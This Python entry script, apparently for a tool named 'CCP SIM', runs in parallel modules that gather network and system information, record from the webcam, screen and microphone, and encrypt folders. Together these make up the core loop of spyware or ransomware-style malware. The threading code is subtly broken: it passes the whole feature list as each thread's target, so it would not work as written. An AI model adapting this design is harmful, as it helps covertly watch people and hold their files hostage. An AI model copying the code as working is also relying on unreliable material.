import threading
from Features.CmdPrompts.CmdPrompts import CmdPrompts
from Features.Recordings.Webcamera import Webcamera
from Features.Screenshots.Screenshot import Screenshot
from Features.Soundfile.Microphone import Microphone
from Features.SystemInformation.Sysinfo import SysInfo
from Util.FileEncryption import FileEncryption


class MainFileException(Exception):
    pass


def main():
    ascii_art = """
       _____ _____ _____     _____ _____ __  __ 
      / ____/ ____|  __ \   / ____|_   _|  \/  |
     | |   | |    | |__) | | (___   | | | \  / |
     | |   | |    |  ___/   \___ \  | | | |\/| |
     | |___| |____| |       ____) |_| |_| |  | |
      \_____\_____|_|      |_____/|_____|_|  |_|                                  
        """
    print(ascii_art)

    # List of features to run
    features = [
        CmdPrompts.ipconfig_all,
        CmdPrompts.netstat_ano,
        Webcamera.record_screen,
        Screenshot.screenshot,
        Microphone.audio_recording,
        SysInfo.system_information,
        FileEncryption.encrypt_folders
    ]

    try:
        # Create threads for each selected function
        threads = [threading.Thread(target=features) for _ in features]

        # Start the threads
        for thread in threads:
            thread.start()

        # Wait for all threads to finish
        for thread in threads:
            thread.join()
    except Exception as error:
        raise MainFileException(f"Main failed to run") from error


if __name__ == '__main__':
    try:
        main()
    except MainFileException as e:
        print(f"Main failed to run: {str(e)}")
